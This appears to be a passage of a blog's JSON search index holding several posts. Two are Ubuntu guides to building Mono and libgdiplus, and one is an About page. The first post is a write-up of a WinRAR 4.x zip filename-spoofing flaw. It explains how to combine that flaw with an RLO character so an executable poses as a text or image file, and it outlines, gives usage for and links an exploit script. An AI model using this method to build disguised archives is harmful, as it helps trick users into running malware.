field的值并不会影响winrar打开zip文件。\n这样一来，只要按照zip的格式，更改和filename2有关的所有字段，就可以写出一个利用脚本了。\n等等，该文章中同时提到了，这个漏洞存在有一个限制：解压。如果你是以右键解压打开这个压缩包的话，那么只会使用filename1，和filename2无关，也就不存在这个漏洞了。作者在文章最后提到了可以利用LRO解决这个限制，那应该如何结合利用RLO呢？\n用WinHex对正常zip文件、使用了字符反转的zip文件进行分析：\n通过对比分析可以看到，当使用含有RLO文件名的文件进行压缩时，压缩的格式有点区别，继续做了几个测试，发现winrar在Extra field添加的信息，不会影响到漏洞的利用。\n据此可以将这两个漏洞完美的结合在一起，写成一个利用脚本。\n以python为例，具体思路为：\n1．生成一个带LRO的文件名的文件，并用winrar压缩为zip。在python中可以使用u'\\u202e'来构造字符串反转，用os.system()函数来执行winrar命令。\r2．处理zip文件中的数据，将filename2更改为自己需要定义的字符串。按照zip格式依次读取，修改filename2为新的字符串，计算出新的长度，并且修改File name length2字段，Sizeofcentraldirectory 和Offsetofstartofcentraldirectory字段，处理好它们新的偏移位置。\r3．重新生成新的zip。\r 在文章最后附上完整的利用脚本WinrarExp.py\n使用方法：\nWinrarExp.py [-f \u0026lt;open file\u0026gt;][-s \u0026lt;forged name\u0026gt;][-v \u0026lt;reversed string\u0026gt;]\n-f表示要压缩的文件，比如1.exe\r-s表示要伪装的文件名，比如readme.txt\r-v表示需要反转的字符串，该参数为选用。比如想要文件名反转变成readmeEXE.jpg则参数只要设置为EXE.jpg\r 下载地址为：http://www.keepwn.com/files/WinrarExp.py\n","permalink":"https://www.keepwn.com/posts/file-spoofing-vulnerability-winrar4-x-scripting/","summary":"0×00 背景 这几天仔细研究了winrar4.x系列的文件扩展名欺骗漏洞的那篇文章，通过一些测试对其有了一些新的想法和建议。（准确的说应该不能算文件扩展名欺骗漏，不止扩展名，整个文件名都是可以欺骗的）\n具体的漏洞成因相信文章中都很清楚了，简单说一下：\nzip格式中有2个filename，一般情况下，一般应用程序打开zip时，预览使用的是filename2，点击预览也是以filename2方式打开的，只有在解压的时候才会使用filename1。然而在winrar4.x中，点击预览是以预览filename1方式打开的。\n这会造成什么结果呢？当第一个filename为readme.exe，第二个filename为readme.txt时，用winrar4.x打开时，你在程序窗口看到的文件名为readme.txt，然后你再点击文件时却是以readme.exe方式打开，这就形成漏洞了。\n文章给出了如何利用这个bug的方法，更改filename2即可。但是作者是手动操作的，那么能不能写成利用脚本呢？这个filename2的长度有没有要求，需不需要和filename1长度相同？这正是本文要研究的。\n0×01 细节 在研究这个问题以前，先科普一下zip格式（想看详细版的去网上下载APPNOTE.TXT）。\nzip格式由3部分组成：\n1. 文件内容源数据\r2. 目录源数据\r3. 目录结束标识结构\r 以只压缩了一个文件的zip文件为例，大致格式为：\n[file header]\r[file data]\r[data descriptor]\r[central directory file header]\r[end of central directory record]\r 其中关键的几个字段为：\n[file header]:\rOffset Bytes Description\r18 4 Compressed size\r26 2 File name length (n)\r28 2 Extra field length (m)\r30 n File name\r30+n m Extra field\r[central directory file header]:\rOffset Bytes Description\r28 2 File name length (n)\r30 2 Extra field length (m)\r34 2 File comment length (k)\r[end of central directory record]:\rOffset Bytes Description\r12 4 Size of central directory (bytes)\r16 4 Offset of start of central directory, relative to start of archive\r 在了解了zip基本格式后，我对winrar压缩生成的zip文件和用windows生成的zip文件进行了分析，它们的区别是winrar的zip文件在Extra field区段都进行了一些数据填充。","title":"Winrar4.x的文件欺骗漏洞利用脚本"},{"content":"0x00 准备工作 一个全新安装的ubuntu13.10系统\n0×01 下载Mono源代码并编译 nike@NIKE-PC:~$ ls\rDesktop Downloads Music Public Videos\rDocuments examples.desktop Pictures Templates\rnike@NIKE-PC:~$ mkdir src\rnike@NIKE-PC:~$ cd src\rnike@NIKE-PC:~/src$ wget http://download.mono-project.com/sources/mono/mono-3.2.8.tar.bz2\r--2014-03-27 21:24:30-- http://download.mono-project.com/sources/mono/mono-3.2.8.tar.bz2\rResolving download.mono-project.com (download.mono-project.com)... 54.240.168.102, 54.230.156.158, 54.230.157.116, ...\rConnecting to download.mono-project.com (download.mono-project.com)|54.240.168.102|:80... connected.\rHTTP request sent, awaiting response... 200 OK\rLength: 77515552 (74M) [application/x-bzip2]\rSaving to: ‘mono-3.2.8.tar.bz2’\r100%[======================================\u0026gt;] 77,515,552 189K/s in 10m 50s\rnike@NIKE-PC:~/src$ ls\rmono-3.2.8.tar.bz2\rnike@NIKE-PC:~/src$ tar -xjf mono-3.2.8.tar.bz2\rnike@NIKE-PC:~/src$ cd mono-3.2.8/\rnike@NIKE-PC:~/src/mono-3.2.8$ ./configure --prefix=/opt/mono-3.2.8\rchecking build system type... i686-pc-linux-gnu\rchecking host system type... i686-pc-linux-gnu\rchecking target system type... i686-pc-linux-gnu\rchecking for a BSD-compatible install... /usr/bin/install -c\rchecking whether build environment is sane... yes\rchecking for a thread-safe mkdir -p... /bin/mkdir -p\rchecking for gawk... no\rchecking for mawk... mawk\rchecking whether make sets $(MAKE)... yes\rchecking how to create a ustar tar archive... gnutar\rchecking whether to enable maintainer-specific portions of Makefiles... no\rchecking whether ln -s works... yes\rchecking whether make supports nested variables... yes\rchecking host platform characteristics... ok\rchecking for gcc... gcc\rchecking for gcc... (cached) gcc\rchecking whether the C compiler works... yes\rchecking for C compiler default output file name... a.out\rchecking for suffix of executables...\rchecking whether we are cross compiling... no\rchecking for suffix of object files... o\rchecking whether we are using the GNU C compiler... yes\rchecking whether gcc accepts -g... yes\rchecking for gcc option to accept ISO C89... none needed\rchecking for style of include used by make... GNU\rchecking dependency style of gcc... gcc3\rchecking for g++... no\rchecking whether we are using the GNU C++ compiler... no\rchecking whether g++ accepts -g... no\rchecking dependency style of g++... none\rchecking dependency style of gcc... gcc3\rchecking for gawk... (cached) mawk\rchecking whether gcc and cc understand -c and -o together... yes\rconfigure: error: You need to install g++\r因为没有安装g++而无法继续：\nnike@NIKE-PC:~/src/mono-3.2.8$ sudo apt-get install g++\r[sudo] password for nike:\rReading package lists... Done\rBuilding dependency tree\rReading state information... Done\rThe following extra packages will be installed:\rcpp-4.8 g++-4.8 gcc-4.8 gcc-4.8-base libasan0 libatomic1 libgcc-4.8-dev\rlibgcc1 libgomp1 libitm1 libquadmath0 libstdc++-4.8-dev libstdc++6\rSuggested packages:\rgcc-4.8-locales g++-multilib g++-4.8-multilib gcc-4.8-doc libstdc++6-4.8-dbg\rgcc-4.8-multilib libmudflap0-4.8-dev libgcc1-dbg libgomp1-dbg libitm1-dbg\rlibatomic1-dbg libasan0-dbg libtsan0-dbg libbacktrace1-dbg libquadmath0-dbg\rlibmudflap0-dbg libstdc++-4.8-doc\rThe following NEW packages will be installed:\rg++ g++-4.8 libstdc++-4.8-dev\rThe following packages will be upgraded:\rcpp-4.8 gcc-4.8 gcc-4.8-base libasan0 libatomic1 libgcc-4.8-dev libgcc1\rlibgomp1 libitm1 libquadmath0 libstdc++6\r11 upgraded, 3 newly installed, 0 to remove and 275 not upgraded.\rNeed to get 25.9 MB of archives.\rAfter this operation, 28.2 MB of additional disk space will be used.\rDo you want to continue [Y/n]?\r==============\u0026gt;省略了很多\u0026lt;==============\r重新初始化mono安装配置文件：\nnike@NIKE-PC:~/src/mono-3.2.8$ ./configure --prefix=/opt/mono-3.2.8\r==============\u0026gt;省略了很多\u0026lt;==============\rEngine:\rGC: sgen and bundled Boehm GC with typed GC and parallel mark\rTLS: __thread\rSIGALTSTACK: yes\rEngine: Building and using the JIT\roprofile: no\rBigArrays: no\rDTrace: no\rLLVM Back End: no (dynamically loaded: no)\rLibraries:\r.NET 2.0/3.5: yes\r.NET 4.0: yes\r.NET 4.5: yes\rMonoDroid: no\rMonoTouch: no\rJNI support: IKVM Native\rlibgdiplus: assumed to be installed\rzlib:\rnike@NIKE-PC:~/src/mono-3.2.8$\r./configure通过。\n0×02 编译Mono源代码 nike@NIKE-PC:~/src/mono-3.2.8$ make\r==============\u0026gt;漫长的编译~\u0026lt;==============\rnike@NIKE-PC:~/src/mono-3.2.8$ sudo make install\r==============\u0026gt;省略了很多\u0026lt;==============\r安装成功。\n##0×03设置PATH环境变量\nnike@NIKE-PC:~/src/mono-3.2.8$ cd ~\rnike@NIKE-PC:~$ vim .bashrc\r在该文件末尾追加以下语句：\nif [ -d /opt/mono-3.2.8/bin ]; then\rexport PATH=/opt/mono-3.2.8/bin:$PATH\rfi\r然后：\nnike@NIKE-PC:~$ . .bashrc\rnike@NIKE-PC:~$ echo $PATH\r/opt/mono-3.2.8/bin:/usr/lib/lightdm/lightdm:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games\rnike@NIKE-PC:~$\r0×04 验证Mono是否安装正确 nike@NIKE-PC:~$ mono --version\rMono JIT compiler version 3.2.8 (tarball 2014年 03月 27日 星期四 21:55:30 CST)\rCopyright (C) 2002-2014 Novell, Inc, Xamarin Inc and Contributors. www.mono-project.com\rTLS: __thread\rSIGSEGV: altstack\rNotifications: epoll\rArchitecture: x86\rDisabled: none\rMisc: softdebug\rLLVM: supported, not enabled.\rGC: sgen\rnike@NIKE-PC:~$ dmcs --version\rMono C# compiler version 3.2.8.0\rnike@NIKE-PC:~$\r安装成功。\n","permalink":"https://www.keepwn.com/posts/ubuntu-installed-mono-environment-1/","summary":"0x00 准备工作 一个全新安装的ubuntu13.10系统\n0×01 下载Mono源代码并编译 nike@NIKE-PC:~$ ls\rDesktop Downloads Music Public Videos\rDocuments examples.desktop Pictures Templates\rnike@NIKE-PC:~$ mkdir src\rnike@NIKE-PC:~$ cd src\rnike@NIKE-PC:~/src$ wget http://download.mono-project.com/sources/mono/mono-3.2.8.tar.bz2\r--2014-03-27 21:24:30-- http://download.mono-project.com/sources/mono/mono-3.2.8.tar.bz2\rResolving download.mono-project.com (download.mono-project.com)... 54.240.168.102, 54.230.156.158, 54.230.157.116, ...\rConnecting to download.mono-project.com (download.mono-project.com)|54.240.168.102|:80... connected.\rHTTP request sent, awaiting response... 200 OK\rLength: 77515552 (74M) [application/x-bzip2]\rSaving to: ‘mono-3.2.8.tar.bz2’\r100%[======================================\u0026gt;] 77,515,552 189K/s in 10m 50s\rnike@NIKE-PC:~/src$ ls\rmono-3.2.8.tar.bz2\rnike@NIKE-PC:~/src$ tar -xjf mono-3.2.8.tar.bz2\rnike@NIKE-PC:~/src$ cd mono-3.2.8/\rnike@NIKE-PC:~/src/mono-3.","title":"ubuntu安装mono环境(一)"},{"content":"接上篇，上篇仅安装了Mono本身，并没有安装libgdiplus、gtk-sharp、mod_mono、MonoDevelop 等其他相关的软件。\n这篇主要是配置安装libgdiplus。\n0×00准备工作 先在VS2012上编译一个winform，代码如下：\nusing System;\rusing System.Windows.Forms;\rnamespace FormsTest\r{\rstatic class Program\r{\r/// \u0026lt;summary\u0026gt;\r/// 应用程序的主入口点。\r/// \u0026lt;/summary\u0026gt;\r[STAThread]\rstatic void Main()\r{\rApplication.EnableVisualStyles();\rApplication.SetCompatibleTextRenderingDefault(false);\rApplication.Run(new Form());\r}\r}\r}\r尝试在ubuntu上用mono运行：\nnike@NIKE-PC:~$ cd Desktop/\rnike@NIKE-PC:~/Desktop$ ls\rFormsTest.exe\rnike@NIKE-PC:~/Desktop$ mono FormsTest.exe\rUnhandled Exception:\rSystem.TypeInitializationException: An exception was thrown by the type initializer for System.Windows.Forms.XplatUI ---\u0026gt; System.TypeInitializationException: An exception was thrown by the type initializer for System.Drawing.GDIPlus ---\u0026gt; System.DllNotFoundException: /opt/mono-3.2.8/lib/libgdiplus.so\rat (wrapper managed-to-native) System.Drawing.GDIPlus:GdiplusStartup (ulong\u0026amp;,System.Drawing.GdiplusStartupInput\u0026amp;,System.Drawing.GdiplusStartupOutput\u0026amp;)\rat System.Drawing.GDIPlus..cctor () [0x00000] in \u0026lt;filename unknown\u0026gt;:0\r--- End of inner exception stack trace ---\rat System.Drawing.Graphics.FromHdcInternal (IntPtr hdc) [0x00000] in \u0026lt;filename unknown\u0026gt;:0\rat System.Windows.Forms.XplatUIX11.SetDisplay (IntPtr display_handle) [0x00000] in \u0026lt;filename unknown\u0026gt;:0\rat System.Windows.Forms.XplatUIX11..ctor () [0x00000] in \u0026lt;filename unknown\u0026gt;:0\rat System.Windows.Forms.XplatUIX11.GetInstance () [0x00000] in \u0026lt;filename unknown\u0026gt;:0\rat System.Windows.Forms.XplatUI..cctor () [0x00000] in \u0026lt;filename unknown\u0026gt;:0\r--- End of inner exception stack trace ---\rat System.Windows.Forms.Application.EnableVisualStyles () [0x00000] in \u0026lt;filename unknown\u0026gt;:0\rat FormsTest.Program.Main () [0x00000] in \u0026lt;filename unknown\u0026gt;:0\r[ERROR] FATAL UNHANDLED EXCEPTION: System.TypeInitializationException: An exception was thrown by the type initializer for System.Windows.Forms.XplatUI ---\u0026gt; System.TypeInitializationException: An exception was thrown by the type initializer for System.Drawing.GDIPlus ---\u0026gt; System.DllNotFoundException: /opt/mono-3.2.8/lib/libgdiplus.so\rat (wrapper managed-to-native) System.Drawing.GDIPlus:GdiplusStartup (ulong\u0026amp;,System.Drawing.GdiplusStartupInput\u0026amp;,System.Drawing.GdiplusStartupOutput\u0026amp;)\rat System.Drawing.GDIPlus..cctor () [0x00000] in \u0026lt;filename unknown\u0026gt;:0\r--- End of inner exception stack trace ---\rat System.Drawing.Graphics.FromHdcInternal (IntPtr hdc) [0x00000] in \u0026lt;filename unknown\u0026gt;:0\rat System.Windows.Forms.XplatUIX11.SetDisplay (IntPtr display_handle) [0x00000] in \u0026lt;filename unknown\u0026gt;:0\rat System.Windows.Forms.XplatUIX11..ctor () [0x00000] in \u0026lt;filename unknown\u0026gt;:0\rat System.Windows.Forms.XplatUIX11.GetInstance () [0x00000] in \u0026lt;filename unknown\u0026gt;:0\rat System.Windows.Forms.XplatUI..cctor () [0x00000] in \u0026lt;filename unknown\u0026gt;:0\r--- End of inner exception stack trace ---\rat System.Windows.Forms.Application.EnableVisualStyles () [0x00000] in \u0026lt;filename unknown\u0026gt;:0\rat FormsTest.Program.Main () [0x00000] in \u0026lt;filename unknown\u0026gt;:0\r遇到错误了System.DllNotFoundException: /opt/mono-3.2.8/lib/libgdiplus.so，原因是如果要在ubuntu运行winform，那么必须要安装libgdiplus。\n0×01下载libgdiplus并编译 nike@NIKE-PC:~$ cd src\rnike@NIKE-PC:~/src$ wget http://download.mono-project.com/sources/libgdiplus/libgdiplus-2.10.9.tar.bz2\r--2014-03-27 22:46:40-- http://download.mono-project.com/sources/libgdiplus/libgdiplus-2.10.9.tar.bz2\rResolving download.mono-project.com (download.mono-project.com)... 54.230.157.116, 54.230.157.204, 54.230.158.216, ...\rConnecting to download.mono-project.com (download.mono-project.com)|54.230.157.116|:80... connected.\rHTTP request sent, awaiting response... 200 OK\rLength: 2074317 (2.0M) [application/x-bzip2]\rSaving to: ‘libgdiplus-2.10.9.tar.bz2’\r100%[======================================\u0026gt;] 2,074,317 224KB/s in 9.5s\r2014-03-27 22:46:54 (213 KB/s) - ‘libgdiplus-2.10.9.tar.bz2’ saved [2074317/2074317]\rnike@NIKE-PC:~/src$ ls\rlibgdiplus-2.10.9.tar.bz2 mono-3.2.8 mono-3.2.8.tar.bz2\rnike@NIKE-PC:~/src$ tar -xvjf libgdiplus-2.10.9.tar.bz2\rnike@NIKE-PC:~/src$ cd libgdiplus-2.10.9/\rnike@NIKE-PC:~/src/libgdiplus-2.10.9$ ./configure --prefix=/opt/mono-3.2.8\r==============\u0026gt;省略了很多\u0026lt;==============\rchecking pkg-config is at least version 0.9.0... yes\rchecking for BASE_DEPENDENCIES... no\rconfigure: error: Package requirements (glib-2.0 \u0026amp;gt;= 2.2.3) were not met:\rNo package 'glib-2.0' found\rConsider adjusting the PKG_CONFIG_PATH environment variable if you\rinstalled software in a non-standard prefix.\rAlternatively, you may set the environment variables BASE_DEPENDENCIES_CFLAGS\rand BASE_DEPENDENCIES_LIBS to avoid the need to call pkg-config.\rSee the pkg-config man page for more details.\r遇到错误了，需要安装libglib2.0-dev：\nnike@NIKE-PC:~/src/libgdiplus-2.10.9$ sudo apt-get install libglib2.0-dev\rReading package lists... Done\rBuilding dependency tree\rReading state information... Done\rThe following extra packages will be installed:\rlibglib2.0-0 libglib2.0-bin libpcre3-dev libpcrecpp0 zlib1g-dev\rSuggested packages:\rlibglib2.0-doc\rThe following NEW packages will be installed:\rlibglib2.0-dev libpcre3-dev libpcrecpp0 zlib1g-dev\rThe following packages will be upgraded:\rlibglib2.0-0 libglib2.0-bin\r2 upgraded, 4 newly installed, 0 to remove and 273 not upgraded.\rNeed to get 2,728 kB of archives.\rAfter this operation, 9,208 kB of additional disk space will be used.\rDo you want to continue [Y/n]?\r==============\u0026gt;省略了很多\u0026lt;==============\r重新初始化libgdiplus安装配置文件：\nnike@NIKE-PC:~/src/libgdiplus-2.10.9$ ./configure --prefix=/opt/mono-3.2.8\r==============\u0026gt;省略了很多\u0026lt;==============\rchecking for libpng14... checking for libpng12... no\rchecking for png_read_info in -lpng... no\rconfigure: error: *** libpng12 not found. See http://www.libpng.org/pub/png/libpng.html.\r又遇到错误了，需要安装libpng-dev：\nnike@NIKE-PC:~/src/libgdiplus-2.10.9$ sudo apt-get install libpng-dev\r重新初始化libgdiplus安装配置文件：\nnike@NIKE-PC:~/src/libgdiplus-2.10.9$ ./configure --prefix=/opt/mono-3.2.8\r==============\u0026gt;省略了很多\u0026lt;==============\r./configure: line 13371: test: too many arguments\rconfigure: error: \u0026quot;Failed to compile with X11/Xlib.h include. You must fix your compiler paths\u0026quot;\r提示错误，需要安装libx11-dev：\nnike@NIKE-PC:~/src/libgdiplus-2.10.9$ sudo apt-get install libx11-dev\r重新初始化libgdiplus安装配置文件：\nnike@NIKE-PC:~/src/libgdiplus-2.10.9$ ./configure --prefix=/opt/mono-3.2.8\r==============\u0026gt;省略了很多\u0026lt;==============\rconfigure: error: Cairo requires at least one font backend.\rPlease install freetype and fontconfig, then try again:\rhttp://freetype.org/ http://fontconfig.org/\rconfigure: error: ./configure failed for cairo\r需要安装freetype和fontconfig：\nnike@NIKE-PC:~/src/libgdiplus-2.10.9$ sudo apt-get install libfreetype6-dev\rnike@NIKE-PC:~/src/libgdiplus-2.10.9$ sudo apt-get install fontconfig\rnike@NIKE-PC:~/src/libgdiplus-2.10.9$ sudo apt-get install libfontconfig1-dev\r重新初始化libgdiplus安装配置文件：\nnike@NIKE-PC:~/src/libgdiplus-2.10.9$ ./configure --prefix=/opt/mono-3.2.8\r==============\u0026gt;省略了很多\u0026lt;==============\rConfiguration summary\r* Installation prefix = /opt/mono-3.2.8\r* Cairo = 1.6.4 (internal)\r* Text = cairo\r* EXIF tags = No. Get it from http://libexif.sourceforge.net/\r* Codecs supported:\r- TIFF: no (Get it from http://www.libtiff.org/)\r- JPEG: no (Get it from http://freshmeat.net/projects/libjpeg)\r- GIF: no (See http://sourceforge.net/projects/libgif)\r- PNG: yes\rNOTE: if any of the above say 'no' you may install the\rcorresponding development packages for them, rerun\rautogen.sh to include them in the build.\rnike@NIKE-PC:\r./configure通过。\n0×02编译安装源代码 nike@NIKE-PC:~/src/libgdiplus-2.10.9$ make\rmake all-recursive\rmake[1]: Entering directory `/home/nike/src/libgdiplus-2.10.9'\rMaking all in pixman\rmake[2]: Entering directory `/home/nike/src/libgdiplus-2.10.9/pixman'\rmake all-recursive\rmake[3]: Entering directory `/home/nike/src/libgdiplus-2.10.9/pixman'\rMaking all in pixman\rmake[4]: Entering directory `/home/nike/src/libgdiplus-2.10.9/pixman/pixman'\r/bin/bash ../libtool --tag=CC --mode=compile gcc -DHAVE_CONFIG_H -I. -I.. -g -O2 -Wall -fvisibility=hidden -MT pixman-access.lo -MD -MP -MF .deps/pixman-access.Tpo -c -o pixman-access.lo pixman-access.c\r../libtool: line 852: X--tag=CC: command not found\r遇到错误了，通过google搜索，可能是因为在项目目录下生成的libtool脚本中定义了$ECHO变量，但是在脚本文件ltmain.sh中，使用的却是$echo（生成的libtool版本太旧）\n解决方法很简单export echo=echo即可：\nnike@NIKE-PC:~/src/libgdiplus-2.10.9$ export echo=echo\rnike@NIKE-PC:~/src/libgdiplus-2.10.9$ make\r==============\u0026gt;省略了很多\u0026lt;==============\rmake[2]: Entering directory `/home/nike/src/libgdiplus-2.10.9/tests'\r/bin/bash ../libtool --tag=CC --mode=link gcc -g -O2 -pthread -o testgdi testgdi.o ../src/libgdiplus.la -lpthread -lfontconfig\rlibtool: link: gcc -g -O2 -pthread -o .libs/testgdi testgdi.o ../src/.libs/libgdiplus.so -lpthread -lfontconfig -pthread -Wl,-rpath -Wl,/opt/mono-3.2.8/lib\r/usr/bin/ld: testgdi.o: undefined reference to symbol 'g_print'\r/lib/i386-linux-gnu/libglib-2.0.so.0: error adding symbols: DSO missing from command line\rcollect2: error: ld returned 1 exit status\rmake[2]: *** [testgdi] Error 1\rmake[2]: Leaving directory `/home/nike/src/libgdiplus-2.10.9/tests'\rmake[1]: *** [all-recursive] Error 1\rmake[1]: Leaving directory `/home/nike/src/libgdiplus-2.10.9'\rmake: *** [all] Error 2\r编译时又出错了，解决办法为：\n1.运行./configure后，编辑tests/Makefile文件\n2.在Makefile文件130行位置，将LIBS = -lpthread -lfontconfig改为LIBS = -lpthread -lfontconfig -lglib-2.0 -lX11\n3.再次运行make即可\nnike@NIKE-PC:~/src/libgdiplus-2.10.9$ vim tests/Makefile\rnike@NIKE-PC:~/src/libgdiplus-2.10.9$ make\r==============\u0026gt;编译很快\u0026lt;==============\rnike@NIKE-PC:~/src/libgdiplus-2.10.9$ sudo make install\r==============\u0026gt;省略了很多\u0026lt;==============\r安装完成。\n0×03设置PATH环境变量 nike@NIKE-PC:~/src/mono-3.2.8$ cd ~\rnike@NIKE-PC:~$ vim .bashrc\r在该文件末尾追加以下语句：\nexport LD_LIBRARY_PATH=/opt/mono-3.2.8/lib\n然后：\nnike@NIKE-PC:~$ . .bashrc\rnike@NIKE-PC:~$ echo $LD_LIBRARY_PATH\r/opt/mono-3.2.8/lib\rnike@NIKE-PC:~$\r0×04验证libgdiplus是否安装成功 nike@NIKE-PC:~$ cd Desktop/\rnike@NIKE-PC:~/Desktop$ mono FormsTest.exe\r运行成功。\n","permalink":"https://www.keepwn.com/posts/ubuntu-installed-mono-environment-2/","summary":"接上篇，上篇仅安装了Mono本身，并没有安装libgdiplus、gtk-sharp、mod_mono、MonoDevelop 等其他相关的软件。\n这篇主要是配置安装libgdiplus。\n0×00准备工作 先在VS2012上编译一个winform，代码如下：\nusing System;\rusing System.Windows.Forms;\rnamespace FormsTest\r{\rstatic class Program\r{\r/// \u0026lt;summary\u0026gt;\r/// 应用程序的主入口点。\r/// \u0026lt;/summary\u0026gt;\r[STAThread]\rstatic void Main()\r{\rApplication.EnableVisualStyles();\rApplication.SetCompatibleTextRenderingDefault(false);\rApplication.Run(new Form());\r}\r}\r}\r尝试在ubuntu上用mono运行：\nnike@NIKE-PC:~$ cd Desktop/\rnike@NIKE-PC:~/Desktop$ ls\rFormsTest.exe\rnike@NIKE-PC:~/Desktop$ mono FormsTest.exe\rUnhandled Exception:\rSystem.TypeInitializationException: An exception was thrown by the type initializer for System.Windows.Forms.XplatUI ---\u0026gt; System.TypeInitializationException: An exception was thrown by the type initializer for System.Drawing.GDIPlus ---\u0026gt; System.","title":"ubuntu安装mono环境(二)"},{"content":"KEEPWN，男，从事网络安全方向，一个懂安全的码农、一个懂编程的白帽。\nSkills  信息安全栈  信息安全解决方案制定与实施（SDL、ISO27001、等级保护等） 攻击与防御（红队/蓝队）  曾参与了▇▇▇▇▇▇▇ 曾研发了▇▇▇▇▇▇▇ 曾挖掘了▇▇▇▇▇▇▇   漏洞靶场的设计/搭建，漏洞验证/利用工具的编写   开发栈  前端常用语言和框架：JS、Vue 后端常用语言：Golang、Python、Java、.Net、PHP   其他  K8S、OpenStack等云平台的落地/二次开发    Contact  Email: NkI2NTY1NzA3NzZFNDA2NzZENjE2OTZDMkU2MzZGNkQ= Github: https://github.com/keepwn/  ","permalink":"https://www.keepwn.com/about/","summary":"KEEPWN，男，从事网络安全方向，一个懂安全的码农、一个懂编程的白帽。\nSkills  信息安全栈  信息安全解决方案制定与实施（SDL、ISO27001、等级保护等） 攻击与防御（红队/蓝队）  曾参与了▇▇▇▇▇▇▇ 曾研发了▇▇▇▇▇▇▇ 曾挖掘了▇▇▇▇▇▇▇   漏洞靶场的设计/搭建，漏洞验证/利用工具的编写   开发栈  前端常用语言和框架：JS、Vue 后端常用语言：Golang、Python、Java、.Net、PHP   其他  K8S、OpenStack等云平台的落地/二次开发    Contact  Email: NkI2NTY1NzA3NzZFNDA2NzZENjE2OTZDMkU2MzZGNkQ= Github: https://github.com/keepwn/  ","title":"About Me"}]